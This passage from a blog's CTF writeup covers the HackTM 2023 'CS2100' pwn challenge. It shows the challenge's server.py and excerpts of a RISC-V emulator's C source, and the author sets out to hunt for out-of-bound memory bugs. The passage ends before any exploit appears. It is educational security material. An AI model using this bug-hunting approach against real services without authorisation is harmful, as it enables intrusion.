<!DOCTYPE html>
<html lang="en-us">
  <head>
    <title>HackTM CTF 2023 | Welcome to Chovid99&#39;s Blog</title>

    <meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta name="viewport" content="width=device-width,minimum-scale=1">
<meta property="og:title" content="HackTM CTF 2023" />
<meta property="og:description" content="Writeup for HackTM CTF 2023 by Chovid99" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://chovid99.github.io/posts/hacktm-ctf-2023/" /><meta property="og:image" content="https://chovid99.github.io/site-feature-image.jpeg"/><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-02-19T20:14:37+07:00" />
<meta property="article:modified_time" content="2023-02-19T20:14:37+07:00" />

<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image:src" content="https://chovid99.github.io/site-feature-image.jpeg"/>

<meta name="twitter:title" content="HackTM CTF 2023"/>
<meta name="twitter:description" content="Writeup for HackTM CTF 2023 by Chovid99"/>
<meta name="twitter:site" content="@Chovid99"/>
<meta name="twitter:creator" content="@Chovid99"/>
<meta property="og:site_name" content="Chovid99's Blog">

<meta name="generator" content="Hugo 0.105.0">


  <META NAME="ROBOTS" CONTENT="INDEX, FOLLOW">


<link rel="stylesheet" href="/css/style.css">
<link rel="stylesheet" href="/css/tocbot.css">



<link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon" />


  <script async src="https://www.googletagmanager.com/gtag/js?id=G-19HP521HQ9"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'G-19HP521HQ9');
  </script>



  
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.css" integrity="sha384-RZU/ijkSsFbcmivfdRBQDtwuwVqK7GMOw6IMvKyeWL2K5UAlyp6WonmB8m7Jd0Hn" crossorigin="anonymous">
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.js" integrity="sha384-pK1WpvzWVBQiP0/GjnvRxV4mOb0oxFuyRxJlk6vVw146n3egcN5C925NCP7a7BY8" crossorigin="anonymous"></script>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/contrib/auto-render.min.js" integrity="sha384-vZTG03m+2yp6N6BNi5iM4rW4oIwk5DfcNdFfxkk9ZWpDriOkXX8voJBFrAO7MpVl" crossorigin="anonymous"
    onload="renderMathInElement(document.body, {delimiters: [{left: '$$', right: '$$', display: true}, {left: '\\[', right: '\\[', display: true}, {left: '$', right: '$', display: false}, {left: '\\(', right: '\\)', display: false}]});"></script>






  </head>

  <body>
    <nav class="navigation">
	
		<a href="/"> <span class="arrow">←</span>Home</a>
	
	<a href="/posts">Posts</a>
	<a href="/tags">Tags</a>
	<a href="/about">About</a>

	

	
</nav>


    <main class="main">
      

<section id="single">
    <h1 class="title">HackTM CTF 2023</h1>

    <div class="tip">
        <time datetime="2023-02-19 20:14:37 &#43;0700 &#43;07">Feb 19, 2023</time>
        <span class="split">
          ·
        </span>
        <span>
          3725 words
        </span>
        <span class="split">
          ·
        </span>
        <span>
          18 minute read
        </span>
    </div>

    <div class="content">
      <div class="post-content js-toc-content">
        <p><p class="markdown-image">
  <img src="https://i.imgur.com/pGRGUGw.png" alt=""  />
</p>
This weekend, I spent my time competing at HackTM CTF 2022 held by WreckTheLine with my local team <code>SKSD</code>. We got 28th place. I managed to solve one pwn challenge called <code>CS2100</code>, and this is my writeup for that challenge.</p>
<h1 id="cs2100">CS2100 <a href="#cs2100" class="anchor">#</a></h1>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>To all my CS2100 Computer Organisation students, I hope you&#39;ve enjoyed the lectures thus far on RISC-V assembly.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>I have set-up an online service for you to test your own RISC-V code!
</span></span><span style="display:flex;"><span>Simply connect to the service through tcp:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>nc 34.141.16.87 10000
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Credit: Thanks to `@fmash16` for his emulator! I didn&#39;t even have to compile the emulator binary myself :O https://github.com/fmash16/riscv_emulator/blob/main/main
</span></span></code></pre></td></tr></table>
</div>
</div><p>Attachment: <a href="https://drive.google.com/file/d/1fvZ0rfXOPmH_HqpG0tDVaPl45_bKmpGC/view?usp=sharing" target="_blank" rel="noopener">https://drive.google.com/file/d/1fvZ0rfXOPmH_HqpG0tDVaPl45_bKmpGC/view?usp=sharing</a></p>
<h2 id="initial-analysis">Initial Analysis <a href="#initial-analysis" class="anchor">#</a></h2>
<p>We were given a zip file contains:</p>
<ul>
<li>Binary called <code>main</code></li>
<li>File called <code>server.py</code></li>
<li>Libc binary <code>libc-2.31.so</code></li>
</ul>
<p>Let&rsquo;s check the <code>server.py</code> file first</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#09f;font-style:italic">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">from</span> <span style="color:#0cf;font-weight:bold">tempfile</span> <span style="color:#069;font-weight:bold">import</span> NamedTemporaryFile
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">from</span> <span style="color:#0cf;font-weight:bold">subprocess</span> <span style="color:#069;font-weight:bold">import</span> check_output, Popen, STDOUT, DEVNULL
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">print_banner</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#366">print</span>(<span style="color:#c30">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#c30">       _____  _____ ___  __  ___   ___  
</span></span></span><span style="display:flex;"><span><span style="color:#c30">      / ____|/ ____|__ \/_ |/ _ \ / _ \ 
</span></span></span><span style="display:flex;"><span><span style="color:#c30">     | |    | (___    ) || | | | | | | |
</span></span></span><span style="display:flex;"><span><span style="color:#c30">     | |     \___ \  / / | | | | | | | |
</span></span></span><span style="display:flex;"><span><span style="color:#c30">     | |____ ____) |/ /_ | | |_| | |_| |
</span></span></span><span style="display:flex;"><span><span style="color:#c30">      \_____|_____/|____||_|\___/ \___/ 
</span></span></span><span style="display:flex;"><span><span style="color:#c30">    &#34;&#34;&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">main</span>():
</span></span><span style="display:flex;"><span>    print_banner()
</span></span><span style="display:flex;"><span>    s <span style="color:#555">=</span> <span style="color:#366">input</span>(<span style="color:#c30">&#34;Please enter your code (hex-encoded):</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#09f;font-style:italic"># Remove all whitespace</span>
</span></span><span style="display:flex;"><span>    s <span style="color:#555">=</span> <span style="color:#c30">&#39;&#39;</span><span style="color:#555">.</span>join(s<span style="color:#555">.</span>split())
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">try</span>:
</span></span><span style="display:flex;"><span>        d <span style="color:#555">=</span> <span style="color:#366">bytes</span><span style="color:#555">.</span>fromhex(s)
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">except</span> <span style="color:#c00;font-weight:bold">ValueError</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#366">print</span>(<span style="color:#c30">&#34;Invalid hex!&#34;</span>)
</span></span><span style="display:flex;"><span>        exit()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">with</span> NamedTemporaryFile() <span style="color:#069;font-weight:bold">as</span> temp_file:
</span></span><span style="display:flex;"><span>        temp_file<span style="color:#555">.</span>write(d)
</span></span><span style="display:flex;"><span>        temp_file<span style="color:#555">.</span>flush()
</span></span><span style="display:flex;"><span>        filename <span style="color:#555">=</span> temp_file<span style="color:#555">.</span>name
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#366">print</span>(<span style="color:#c30">&#34;</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">Output:&#34;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">with</span> Popen([<span style="color:#c30">&#34;./main&#34;</span>, filename], stderr<span style="color:#555">=</span>STDOUT, stdin<span style="color:#555">=</span>DEVNULL) <span style="color:#069;font-weight:bold">as</span> process:
</span></span><span style="display:flex;"><span>            process<span style="color:#555">.</span>wait()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">if</span> __name__ <span style="color:#555">==</span> <span style="color:#c30">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>    main()
</span></span></code></pre></td></tr></table>
</div>
</div><p>Ah okay, so it just read hex-encoded bytecode, stored it in a temporary file, and then pass it to the binary <code>main</code>.</p>
<p>The problem description also gives us a link to a <a href="https://github.com/fmash16/riscv_emulator/blob/main/main" target="_blank" rel="noopener">github repo</a>. Turn out, the given binary is the compiled version of that repo, which is a riscv emulator. Instead of decompiling the binary, we can just clone the repo and try to analyze the source code.</p>
<p>I noticed that this challenge is pretty similar to RealWorld CTF 2023 challenge called <code>tinyvm</code>, where the given repo is a vm of x86 assembly implemented in C, while for this challenge, the repo tries to implement RISC-V emulator. So, based on that experience, I decided to try to look whether there might be Out-of-Bound Read and Write on the given repo, because it is the common mistake of developer during building a simulator. Let&rsquo;s first inspect the <code>main.c</code> file:</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span><span style="color:#078;font-weight:bold">int</span> main(<span style="color:#078;font-weight:bold">int</span> argc, <span style="color:#078;font-weight:bold">char</span><span style="color:#555">*</span> argv[]) {
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> (argc <span style="color:#555">!=</span> <span style="color:#f60">2</span>) {
</span></span><span style="display:flex;"><span>        printf(<span style="color:#c30">&#34;Usage: rvemu &lt;filename&gt;</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
</span></span><span style="display:flex;"><span>        exit(<span style="color:#f60">1</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#09f;font-style:italic">// Initialize cpu, registers and program counter
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>    <span style="color:#069;font-weight:bold">struct</span> CPU cpu;
</span></span><span style="display:flex;"><span>    cpu_init(<span style="color:#555">&amp;</span>cpu);
</span></span><span style="display:flex;"><span>    <span style="color:#09f;font-style:italic">// Read input file
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>    read_file(<span style="color:#555">&amp;</span>cpu, argv[<span style="color:#f60">1</span>]);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#09f;font-style:italic">// cpu loop
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>    <span style="color:#069;font-weight:bold">while</span> (<span style="color:#f60">1</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#09f;font-style:italic">// fetch
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>        <span style="color:#078;font-weight:bold">uint32_t</span> inst <span style="color:#555">=</span> cpu_fetch(<span style="color:#555">&amp;</span>cpu);
</span></span><span style="display:flex;"><span>        <span style="color:#09f;font-style:italic">// Increment the program counter
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>        cpu.pc <span style="color:#555">+=</span> <span style="color:#f60">4</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#09f;font-style:italic">// execute
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>        <span style="color:#069;font-weight:bold">if</span> (<span style="color:#555">!</span>cpu_execute(<span style="color:#555">&amp;</span>cpu, inst))
</span></span><span style="display:flex;"><span>            <span style="color:#069;font-weight:bold">break</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        dump_registers(<span style="color:#555">&amp;</span>cpu);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">if</span>(cpu.pc<span style="color:#555">==</span><span style="color:#f60">0</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#069;font-weight:bold">break</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#09f;font-style:italic">/*dump_registers(&amp;cpu);*/</span>
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> <span style="color:#f60">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></td></tr></table>
</div>
</div><p>Okay, so basically, the file required us to input a filename, which will be loaded to the <code>CPU</code> struct, and then it will iterate the instructions we supplied in the file. Checking the <code>cpu_execute</code> implementation, the emulator implements a lot of <code>RISC-V</code> instructions.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#078;font-weight:bold">int</span> <span style="color:#c0f">cpu_execute</span>(CPU <span style="color:#555">*</span>cpu, <span style="color:#078;font-weight:bold">uint32_t</span> inst) {
</span></span><span style="display:flex;"><span>    <span style="color:#078;font-weight:bold">int</span> opcode <span style="color:#555">=</span> inst <span style="color:#555">&amp;</span> <span style="color:#f60">0x7f</span>;           <span style="color:#09f;font-style:italic">// opcode in bits 6..0
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>    <span style="color:#078;font-weight:bold">int</span> funct3 <span style="color:#555">=</span> (inst <span style="color:#555">&gt;&gt;</span> <span style="color:#f60">12</span>) <span style="color:#555">&amp;</span> <span style="color:#f60">0x7</span>;    <span style="color:#09f;font-style:italic">// funct3 in bits 14..12
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>    <span style="color:#078;font-weight:bold">int</span> funct7 <span style="color:#555">=</span> (inst <span style="color:#555">&gt;&gt;</span> <span style="color:#f60">25</span>) <span style="color:#555">&amp;</span> <span style="color:#f60">0x7f</span>;   <span style="color:#09f;font-style:italic">// funct7 in bits 31..25
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>
</span></span><span style="display:flex;"><span>    cpu<span style="color:#555">-&gt;</span>regs[<span style="color:#f60">0</span>] <span style="color:#555">=</span> <span style="color:#f60">0</span>;                   <span style="color:#09f;font-style:italic">// x0 hardwired to 0 at each cycle
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>
</span></span><span style="display:flex;"><span>    <span style="color:#09f;font-style:italic">/*printf(&#34;%s\n%#.8lx -&gt; Inst: %#.8x &lt;OpCode: %#.2x, funct3:%#x, funct7:%#x&gt; %s&#34;,*/</span>
</span></span><span style="display:flex;"><span>            <span style="color:#09f;font-style:italic">/*ANSI_YELLOW, cpu-&gt;pc-4, inst, opcode, funct3, funct7, ANSI_RESET); // DEBUG*/</span>
</span></span><span style="display:flex;"><span>    printf(<span style="color:#c30">&#34;%s</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">%#.8lx -&gt; %s&#34;</span>, ANSI_YELLOW, cpu<span style="color:#555">-&gt;</span>pc<span style="color:#555">-</span><span style="color:#f60">4</span>, ANSI_RESET); <span style="color:#09f;font-style:italic">// DEBUG
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">switch</span> (opcode) {
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">case</span> <span style="color:#99f">LUI</span>:   exec_LUI(cpu, inst); <span style="color:#069;font-weight:bold">break</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">case</span> <span style="color:#99f">AUIPC</span>: exec_AUIPC(cpu, inst); <span style="color:#069;font-weight:bold">break</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">case</span> <span style="color:#99f">JAL</span>:   exec_JAL(cpu, inst); <span style="color:#069;font-weight:bold">break</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">case</span> <span style="color:#99f">JALR</span>:  exec_JALR(cpu, inst); <span style="color:#069;font-weight:bold">break</span>;
